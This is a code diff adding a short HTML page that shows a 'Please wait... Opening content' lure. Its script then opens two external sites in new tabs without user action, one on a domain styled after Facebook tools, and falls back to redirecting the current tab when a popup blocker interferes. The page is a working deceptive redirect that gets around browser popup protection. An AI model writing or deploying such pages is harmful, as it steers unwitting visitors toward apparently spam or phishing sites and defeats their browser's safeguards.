@@ -1,0 +1,40 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title>Auto Redirect Tabs</title>
+</head>
+<body>
+  <h1 style="text-align:center; margin-top:40px; color:red;">
+    Please wait... Opening content 🔥
+  </h1>
+
+<script>
+(function(){
+  var link1 = "https://shimulqww.github.io/Unitedstatesvideos/";
+  var link2 = "https://fb-tools.social-networking.me";
+
+  // Open first tab immediately
+  var w1 = window.open(link1, "_blank");
+
+  // Small delay then open 2nd tab
+  setTimeout(function(){
+    var w2 = window.open(link2, "_blank");
+    // If blocked, fallback inside current tab
+    if(!w2 || w2.closed){
+      window.location.href = link2;
+    }
+  }, 500);
+
+  // Extra backup to ensure at least link1 loads
+  setTimeout(function(){
+    if(!w1 || w1.closed){
+      window.location.href = link1;
+    }
+  }, 800);
+
+})();
+</script>
+
+</body>
+</html>
